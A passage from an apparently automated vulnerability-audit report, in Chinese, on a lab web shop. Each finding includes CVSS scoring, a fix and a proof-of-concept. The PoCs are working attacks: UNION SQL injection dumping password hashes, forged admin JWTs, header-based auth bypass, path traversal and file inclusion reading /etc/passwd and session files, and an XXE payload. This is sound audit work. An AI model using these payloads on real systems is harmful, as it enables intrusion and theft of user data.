  结论：第 3 行 $term=(string)($_GET['q']??'') 直接取自查询字符串，第 4 行用字符串拼接构造 "SELECT id,name,description,price,stock,color FROM products WHERE name LIKE '%".$term."%' ORDER BY id" 并调用 db()->query()。bootstrap.php 的 db() 设置了 PDO::ATTR_EMULATE_PREPARES=false，说明本可使用服务端预处理，但此处完全没有使用 prepare/execute，仅做了 (string) 强制转换，未做任何引号转义或参数绑定 (h() 只在第 5 行输出时用于 HTML 转义，不参与 SQL)。因此单引号即可闭合 LIKE 字面量并注入任意 SQL，且结果集在第 5 行逐行渲染，可作 UNION 回显注入。
  输入：HTTP GET 参数 q（匿名可访问，无需登录）
  传播：$_GET['q'] -> (string)$term -> 拼接进 SELECT ... WHERE name LIKE '%$term%' -> db()->query() 执行 -> fetchAll -> 页面渲染
  危险操作：PDO::query 执行拼接了外部输入的 SQL 语句
  保护：无：未使用预处理语句，也未对 $term 做引号转义；h() 仅用于 HTML 输出上下文
  前提：['目标页面 /catalog/index.php 可匿名访问']
  修复建议：改用预处理：$q=db()->prepare('... WHERE name LIKE ? ORDER BY id'); $q->execute(['%'.$term.'%']); 并将 % 与 _ 通配符转义。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：db35a73a71c34f5f9ebd6462a6f0856e
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-28T10:35:10.426253+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | HTTP 接口 | lab30-shop/app/public/catalog/index.php:3-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 单引号闭合即可注入，无需特殊条件 | lab30-shop/app/public/catalog/index.php:4-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | N | 无需认证 | lab30-shop/app/public/catalog/index.php:2-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 无他人参与 | lab30-shop/app/public/catalog/index.php:4-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 同一数据库组件内 | lab30-shop/app/public/catalog/index.php:4-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | H | UNION 可读取任意表（如 users 密码哈希） | lab30-shop/app/public/catalog/index.php:4-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | N | 读查询，未见写操作 | lab30-shop/app/public/catalog/index.php:4-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | N | 无明显可用性影响 | lab30-shop/app/public/catalog/index.php:4-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'poc_sqli_catalog.sh', 'language': 'bash', 'script': '#!/bin/bash\nT=http://TARGET/catalog/index.php\n# 对照：正常搜索\ncurl -s "$T?q=book" | grep -o \'共找到 <span id="result-count">[0-9]*\' \n# 注入：闭合 LIKE 并 UNION 读取 users 数据\ncurl -s -G "$T" --data-urlencode "q=\' UNION SELECT id,username,password_md5,email,1,\'x\' FROM users-- -" | grep -o \'<h2>[^<]*</h2>\'\n', 'instructions': '替换 TARGET，正常请求与注入请求对比；注入 payload 需列数与 SELECT 的 6 列一致。', 'normal_input': 'q=book', 'attack_input': "q=' UNION SELECT id,username,password_md5,email,1,'x' FROM users-- -", 'expected_result': '对照组只返回商品；注入请求返回含用户名/密码哈希的行，证明 SQL 注入可读任意数据'}
````


### 台账 `0a74ebc83d204eb9bbafdf036e928c07`

- partner/portal.php 仅解码 JWT payload 不验证签名，伪造 role=admin 令牌即可读取全量订单结算数据（CVSS 3.1 Base 7.5 (high) · CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N，验证：unverified）
  来源 `c2f63ccf9f54404a9fd502aefbc1fcac` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/partner/portal.php', 'start_line': 2, 'end_line': 6}, {'path': 'lab30-shop/app/public/partner/token.php', 'start_line': 3, 'end_line': 4}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 26, 'end_line': 28}]
  结论：portal.php:2 从 POST token 或 Cookie partner_token 取令牌，拆为三段后只对第二段 base64 解码为 payload；portal.php:3 仅检查 $payload['role']==='admin' 即放行，从未调用 hash_hmac 或比对签名（token.php:4 表明服务端本应使用 HMAC-SHA256 签名）。因此攻击者可提交 header.e30.signature 形式的自造令牌，以管理员身份执行 portal.php:4 的 SELECT order_no,total FROM orders 并经由第 5 行 JSON 响应或第 6 行页面获得全部订单号与金额。
  输入：POST 参数 token 或 Cookie partner_token
  传播：$_POST['token']/$_COOKIE['partner_token'] → explode('.') → base64_decode($parts[1]) → json_decode → 仅校验 $payload['role']
  危险操作：在无签名校验的伪造身份下执行 SELECT order_no,total FROM orders 并返回结算数据
  保护：无：未验证签名段，无密钥校验，仅使用攻击者完全可控的 payload
  前提：['攻击者能访问 /partner/portal.php（页面本身不要求登录，只看令牌内容）']
  修复建议：用服务端密钥对 $header.'.'.$payload 重新计算 hash_hmac('sha256') 并用 hash_equals 与签名段比对，同时校验 alg/exp；优先改为服务端会话校验角色而非客户端令牌。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：db35a73a71c34f5f9ebd6462a6f0856e
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-28T10:35:31.607725+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | 通过 HTTP 直接访问 portal.php | lab30-shop/app/public/partner/portal.php:2-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 仅需构造 base64 编码的 payload 与任意签名段，格式固定 | lab30-shop/app/public/partner/portal.php:2-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | N | portal.php 未调用 require_user，仅凭令牌内容判权 | lab30-shop/app/public/partner/portal.php:2-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 无其他用户参与 | lab30-shop/app/public/partner/portal.php:2-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 在同一应用授权边界内取得未授权数据 | lab30-shop/app/public/partner/portal.php:3-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | H | 返回全站订单号与金额结算数据 | lab30-shop/app/public/partner/portal.php:4-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | N | 仅读取，无写入 | lab30-shop/app/public/partner/portal.php:4-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | N | 不影响可用性 | lab30-shop/app/public/partner/portal.php:4-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'portal_jwt_forge.py', 'language': 'python', 'script': "import base64, json, urllib.parse, urllib.request\n\ndef b64(b):\n    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()\n\nheader = {'alg':'HS256','typ':'JWT'}\npayload = {'sub':1,'role':'admin','name':'attacker'}\ntoken = b64(json.dumps(header).encode()) + '.' + b64(json.dumps(payload).encode()) + '.forgedsignature'\n\ndata = urllib.parse.urlencode({'token': token}).encode()\nreq = urllib.request.Request('http://TARGET/partner/portal.php', data=data,\n                             headers={'Accept':'application/json','Content-Type':'application/x-www-form-urlencoded'})\nprint(urllib.request.urlopen(req).read().decode())\n", 'instructions': '将 TARGET 替换为靶场主机；脚本向 /partner/portal.php 提交自造 JWT（payload 中 role=admin，签名段任意），服务端不验签即返回 {"role":"admin","settlements":[...]}。', 'normal_input': 'token=<合法低权令牌> 或空', 'attack_input': 'token=eyJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiYWRtaW4ifQ.forgedsignature', 'expected_result': '攻击请求返回 role=admin 与全部订单结算列表；低权/空令牌返回 403 提示。'}
````


### 台账 `d9ebbde88c494169858f477228d6460f`

- ops/maintenance.php 仅凭客户端可伪造的 HTTP_X_ADMIN 请求头通过服务身份校验并入队作业（CVSS 3.1 Base 6.5 (medium) · CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N，验证：unverified）
  来源 `37d4a26e7af344c19a7f8e9997bb85ff` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/ops/maintenance.php', 'start_line': 2, 'end_line': 5}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 33, 'end_line': 37}]
  结论：maintenance.php:3 直接比较 $_SERVER['HTTP_X_ADMIN'] 是否等于字符串 '1'，未使用会话、角色或任何共享密钥，而 X-Admin 是客户端可任意设置的自由请求头。通过该校验后第 4 行以 prepare 插入 jobs 记录（user_id=4, title='系统对账'）并返回 job_id，第 5 行还会泄露内部服务名称与 authorized=true。
  输入：HTTP 请求头 X-Admin
  传播：$_SERVER['HTTP_X_ADMIN'] → 字符串比较 → 直接进入 POST 分支
  危险操作：以服务身份向 jobs 表写入作业记录并通过 json_response 回显
  保护：无有效防护：仅比对客户端可控的请求头，未校验来源或密钥
  前提：['攻击者可直接向 /ops/maintenance.php 发请求（无需登录）']
  修复建议：删除基于请求头的信任，改为使用共享密钥签名(如 HMAC+时间戳)或内置服务账号鉴权，并对管理操作强制 require_user(['admin']) 与 CSRF 校验。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：db35a73a71c34f5f9ebd6462a6f0856e
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-28T10:35:31.608783+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | HTTP 请求直接可达 | lab30-shop/app/public/ops/maintenance.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 只需添加一个请求头并 POST | lab30-shop/app/public/ops/maintenance.php:3-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | N | 无需登录 | lab30-shop/app/public/ops/maintenance.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 无其他用户参与 | lab30-shop/app/public/ops/maintenance.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 在应用自身权限模型内获得受限操作 | lab30-shop/app/public/ops/maintenance.php:3-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | L | 返回服务名与 accepted/job_id | lab30-shop/app/public/ops/maintenance.php:4-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | L | 可向 jobs 表插入作业记录 | lab30-shop/app/public/ops/maintenance.php:4-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | N | 未见可用性影响 | lab30-shop/app/public/ops/maintenance.php:4-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'maintenance_header_bypass.sh', 'language': 'bash', 'script': "#!/bin/sh\ncurl -s -i -X POST http://TARGET/ops/maintenance.php \\\n  -H 'X-Admin: 1' -H 'Accept: application/json'\n", 'instructions': '将 TARGET 换成靶场主机；不带任何会话 Cookie，仅添加 X-Admin: 1 请求头 POST 即可。', 'normal_input': '不带 X-Admin 头访问 /ops/maintenance.php', 'attack_input': 'X-Admin: 1', 'expected_result': '正常请求返回 403 内部维护接口需要有效的服务身份；带 X-Admin 头返回 {"accepted":true,"job_id":N}。'}
````


### 台账 `5f8a819f26e14990a4204f0220c29672`

- content/page.php 将 $_GET['page'] 直接拼接进 include 实现路径穿越式文件包含（CVSS 3.1 Base 6.5 (medium) · CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N，验证：unverified）
  来源 `eb450911004249378a8bae4ba1951a7e` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/content/page.php', 'start_line': 1, 'end_line': 3}]
  结论：content/page.php 第2行 $name=(string)($_GET['page']??'home') 接受外部输入且未做任何规范化/白名单；第3行 'include APP_ROOT.'/resources/views/'.$name.'.php'' 直接拼接后包含。攻击者用 ../ 序列可逃出 views 目录，包含并执行任意可访问的 .php 文件（本地文件包含），或读取系统上 .php 文件内容。无 basename、realpath 前缀校验或 allowlist。
  输入：HTTP GET 参数 page
  传播：$_GET['page'] -> $name -> 字符串拼接 include 路径 -> include 执行
  危险操作：include APP_ROOT.'/resources/views/'.$name.'.php'
  保护：无：未使用 basename、白名单或 realpath 前缀检查
  前提：['页面 /content/page.php 可匿名访问']
  修复建议：对 page 参数使用白名单映射到固定模板文件；如需动态文件名使用 basename() 去除路径成分并用 realpath 校验落在 views 目录内。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：db35a73a71c34f5f9ebd6462a6f0856e
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-28T10:36:02.353172+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | 页面经 HTTP 直接访问 | lab30-shop/app/public/content/page.php:2-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 仅需构造 page 参数路径 | lab30-shop/app/public/content/page.php:2-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | N | content/page.php 未调用 require_user | lab30-shop/app/public/content/page.php:1-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 无需他人参与 | lab30-shop/app/public/content/page.php:2-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 仍在同一应用上下文 | lab30-shop/app/public/content/page.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | L | 可包含读取任意 .php 文件内容 | lab30-shop/app/public/content/page.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | L | 包含执行可改变页面逻辑/输出但无直接定向写入证据 | lab30-shop/app/public/content/page.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | N | 无证据表明影响可用性 | lab30-shop/app/public/content/page.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'lfi_content_page.sh', 'language': 'bash', 'script': "curl -s ''http://TARGET/content/page.php?page=../../../../etc/passwd%00'' -o /dev/null -w ''%{http_code}\\n''\ncurl -s ''http://TARGET/content/page.php?page=home'' -o /dev/null -w ''%{http_code}\\n''", 'instructions': '替换 TARGET 为目标主机，观察正常 page=home 返回 200 内容中心，而穿越参数触发不同包含行为（如需附加 .php 后缀可指定 ../src/bootstrap 等既有文件）。', 'normal_input': 'page=home', 'attack_input': 'page=../../../../../some/file', 'expected_result': '正常参数渲染 home 模板；穿越参数包含 views 目录之外文件，返回结果与页面模板相关错误/输出差异。'}
````

- content/page.php 将 $_GET['page'] 直接拼接进 include 造成 LFI/路径穿越（CVSS 3.1 Base 5.3 (medium) · CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N，验证：unverified）
  来源 `6a49858edfc04015be3949f19c83b0cf` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/content/page.php', 'start_line': 1, 'end_line': 3}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 3, 'end_line': 3}]
  结论：content/page.php:2 从 $_GET['page'] 取值（默认 home），:3 在 page() 回调中执行 include APP_ROOT.'/resources/views/'.$name.'.php'。$name 未经白名单、正则或 basename 过滤，仅被追加固定 .php 后缀。攻击者传入 ../ 序列可穿越出 views 目录，包含服务器上其他 .php 文件（如 bootstrap、配置或上传目录内可控文件），导致本地文件包含。
  输入：$_GET['page']
  传播：$name = (string)($_GET['page'] ?? 'home') -> 闭包 use($name) -> include APP_ROOT.'/resources/views/'.$name.'.php'
  危险操作：include 拼接外部可控路径
  保护：无白名单/无 basename/无 realpath 校验；仅固定追加 .php 后缀，不能阻止 ../ 穿越。
  前提：['页面 /content/page.php 可匿名访问；需知道目标可包含 .php 文件相对路径。']
  修复建议：对 page 参数做严格白名单（如 in_array($name, ['home','shipping'], true)）或 basename+正则限制，避免任何路径分隔符。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：db35a73a71c34f5f9ebd6462a6f0856e
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-28T10:50:11.921558+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | HTTP 入口可远程访问 | lab30-shop/app/public/content/page.php:1-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 仅需构造 page 参数 | lab30-shop/app/public/content/page.php:2-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | N | 页面无需登录 | lab30-shop/app/public/content/page.php:2-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 无需其他用户参与 | lab30-shop/app/public/content/page.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 同一 PHP 进程内包含文件 | lab30-shop/app/public/content/page.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | L | 可包含并执行/读取任意 .php 文件内容 | lab30-shop/app/public/content/page.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | N | 包含本身不直接写数据；取决于被包含文件行为 | lab30-shop/app/public/content/page.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | N | 无直接破坏可用性依据 | lab30-shop/app/public/content/page.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'content_lfi.txt', 'language': 'text', 'script': 'GET /content/page.php?page=../../../app/src/bootstrap HTTP/1.1\nHost: target', 'instructions': '请求 /content/page.php?page=../../../app/src/bootstrap，观察是否包含 views 目录之外的文件；也可尝试包含已知上传/日志 .php 文件。', 'normal_input': 'page=shipping', 'attack_input': 'page=../../../app/src/bootstrap', 'expected_result': '正常值包含 views/shipping.php；穿越值包含 views 目录外文件，响应中出现非预期文件内容或错误差异。'}
````


### 台账 `72cb4ac981524dc3bbfd1e1f1e203564`

- support/download.php 将 $_GET['file'] 拼接进 data_dir 后 file_get_contents（路径穿越读取）（CVSS 3.1 Base 6.5 (medium) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N，验证：unverified）
  来源 `feda1520c769499e85f1bb74724fd6fc` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/support/download.php', 'start_line': 1, 'end_line': 4}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 9, 'end_line': 9}]
  结论：support/download.php 第3行：$path=data_dir().'/docs/'.(string)$_GET['file']; 随后 is_file($path) 通过即 file_get_contents($path) 并原样输出。file 参数未过滤 ../ 或绝对路径，可逃逸 docs 目录读取 /var/lib/shop 下会话/数据文件或其他可读路径。data_dir() 返回 /var/lib/shop（bootstrap.php:9），因此还会暴露 sessions 下的会话文件。
  输入：HTTP GET 参数 file
  传播：$_GET['file'] -> 字符串拼接 data_dir().'/docs/' -> is_file 检查 -> file_get_contents -> 响应体输出
  危险操作：file_get_contents(data_dir().'/docs/'.$_GET['file'])
  保护：无：未使用 basename、realpath 前缀校验或白名单
  前提：['攻击者持有效登录会话（注册即可获得）；需知道目标可读文件路径']
  修复建议：使用 basename() 限制文件名，并 realpath 后校验前缀为 data_dir().'/docs'；或改用固定文件名白名单。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：db35a73a71c34f5f9ebd6462a6f0856e
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-28T10:36:02.354159+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | HTTP 直接访问 | lab30-shop/app/public/support/download.php:1-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 只需构造 file 参数 | lab30-shop/app/public/support/download.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | 第2行 require_user() 要求登录，注册即可获得普通账号 | lab30-shop/app/public/support/download.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 无需他人参与 | lab30-shop/app/public/support/download.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 同一应用进程读取文件 | lab30-shop/app/public/support/download.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | H | 可读取 data_dir 之外任意可读文件 | lab30-shop/app/public/support/download.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | N | 仅读取，无写入证据 | lab30-shop/app/public/support/download.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | N | 无证据影响可用性 | lab30-shop/app/public/support/download.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'path_traversal_download.sh', 'language': 'bash', 'script': "curl -s -b ''SHOPSESSID=SESSION'' ''http://TARGET/support/download.php?file=shipping.txt''\ncurl -s -b ''SHOPSESSID=SESSION'' ''http://TARGET/support/download.php?file=../sessions/SESSION''", 'instructions': '使用已登录会话 Cookie 替换 SESSION 和目标主机 TARGET。', 'normal_input': 'file=shipping.txt', 'attack_input': 'file=../sessions/<sid>', 'expected_result': '正常参数返回 docs/shipping.txt 内容；穿越参数返回 docs 目录之外文件内容，证明可读取任意路径。'}
````


### 台账 `7905401b64084de6956b3ecd7b67e0a9`

- ops/xml-import.php 使用 LIBXML_NOENT|LIBXML_DTDLOAD 解析用户 XML，外部实体被替换并回显（XXE）（CVSS 3.1 Base 6.5 (medium) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N，验证：unverified）
  来源 `7689711fd1f242dca413ca6b798589d6` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/ops/xml-import.php', 'start_line': 1, 'end_line': 4}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 33, 'end_line': 37}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 10, 'end_line': 10}]
  结论：第2行只要求 operator/admin 登录；第3行将 POST xml 直接交给 simplexml_load_string，并显式传入 LIBXML_NOENT|LIBXML_DTDLOAD，允许 DTD 与外部实体解析，且实体替换后的节点文本被 $doc->title 取出，第4行通过 h($output) 输出到 <pre>，形成可回显的 XXE，可读取服务器本地文件或发起服务端请求。代码中无任何 DTD/实体白名单或禁用外部实体的处理。
  输入：POST 参数 xml（运营工作台 XML 导入表单）
  传播：$_POST['xml'] -> simplexml_load_string($xml,'SimpleXMLElement',LIBXML_NOENT|LIBXML_DTDLOAD) -> (string)$doc->title -> h($output) 写入响应
  危险操作：simplexml_load_string 允许外部实体解析并回显实体内容
  保护：仅有 require_user(['operator','admin']) 与 check_csrf()，无 XXE 防护（未禁用 LIBXML_NOENT/DTDLOAD，未使用 libxml_disable_entity_loader 或过滤 DOCTYPE）
  前提：['攻击者持有 operator 或 admin 角色会话与对应 CSRF token']
  修复建议：禁止 DTD/外部实体解析：去掉 LIBXML_NOENT|LIBXML_DTDLOAD，改用 LIBXML_NONET，或使用不解析实体的安全解析器。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：db35a73a71c34f5f9ebd6462a6f0856e
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-28T10:36:22.667513+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | 通过 HTTP 表单提交 XML | lab30-shop/app/public/ops/xml-import.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 构造标准 XXE DTD 即触发 | lab30-shop/app/public/ops/xml-import.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | 需要 operator/admin 角色登录 | lab30-shop/app/public/ops/xml-import.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 攻击者自身发起请求 | lab30-shop/app/public/ops/xml-import.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 影响限于解析该 XML 的进程 | lab30-shop/app/public/ops/xml-import.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | H | 外部实体可读取任意本地文件并回显 | lab30-shop/app/public/ops/xml-import.php:3-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | N | 未观察到写入 | lab30-shop/app/public/ops/xml-import.php:3-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | N | 未观察到破坏 | lab30-shop/app/public/ops/xml-import.php:3-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'xxe_xml_import.py', 'language': 'python', 'script': 'import re,urllib.request,urllib.parse,http.cookiejar\nB=\'http://target\'\ncj=http.cookiejar.CookieJar();op=urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))\ndef get(p):return op.open(B+p).read().decode(\'utf-8\',\'replace\')\n# 1) login (adapt credentials) and 2) obtain csrf token from xml-import page\ntok=re.search(r\'name="csrf" value="([0-9a-f]+)"\',get(\'/ops/xml-import.php\')).group(1)\npayload=\'<?xml version="1.0"?><!DOCTYPE c [<!ENTITY x SYSTEM "file:///etc/passwd">]><config><title>&x;</title></config>\'\ndata=urllib.parse.urlencode({\'csrf\':tok,\'xml\':payload}).encode()\nr=op.open(B+\'/ops/xml-import.php\',data).read().decode(\'utf-8\',\'replace\')\nprint(re.search(r\'<pre>(.*?)</pre>\',r,re.S).group(1)[:400])', 'instructions': '使用 operator/admin 账号先登录并进入 /ops/xml-import.php 获取 CSRF token，然后 POST 上述 XML；响应 <pre> 中会回显 /etc/passwd 内容。', 'normal_input': '<config><title>春日上新</title></config>', 'attack_input': '<?xml version="1.0"?><!DOCTYPE c [<!ENTITY x SYSTEM "file:///etc/passwd">]><config><title>&x;</title></config>', 'expected_result': '正常输入回显“春日上新”；攻击输入回显 /etc/passwd 文件内容。'}
````


### 台账 `5a1f8b8736b246b9ae6d081c49f50198`

- orders/create.php 使用客户端提交的 price 计算订单金额（价格篡改）（CVSS 3.1 Base 7.1 (high) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:L，验证：unverified）
  来源 `3aec7dd11d444d258c632c05736ffa98` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/orders/create.php', 'start_line': 1, 'end_line': 7}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 33, 'end_line': 37}]
  结论：第3-4行从 POST 读取 price 并用 FILTER_VALIDATE_FLOAT 校验，只要求 >0，未与数据库 products 表中的实际价格比较；第5行 $total=round($price*$quantity,2)，第7行将 unit_price 与 total 直接写入 orders 表，因此攻击者可用任意低价格（如 0.01）下单，造成业务金额篡改。
  输入：POST 参数 price 与 quantity、product_id
  传播：$_POST['price'] -> filter_var(...,FILTER_VALIDATE_FLOAT) -> $total=round($price*$quantity,2) -> INSERT INTO orders(unit_price,total)
  危险操作：以客户端可控价格写入订单金额并扣减库存
  保护：仅校验价格 >=0 与数量范围；产品查询 SQL 使用预处理，但产品真实价格未参与金额计算
  前提：['攻击者持有效登录会话与 CSRF token（注册即可获得）']
  修复建议：服务端从 products 表读取真实价格计算总额，忽略客户端 price 字段。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：db35a73a71c34f5f9ebd6462a6f0856e
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-28T10:36:22.668740+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | HTTP POST 下单 | lab30-shop/app/public/orders/create.php:3-7 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 改一个表单字段即可 | lab30-shop/app/public/orders/create.php:3-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | 需普通登录用户 | lab30-shop/app/public/orders/create.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 攻击者自身操作 | lab30-shop/app/public/orders/create.php:2-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 影响订单数据本身 | lab30-shop/app/public/orders/create.php:7-7 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
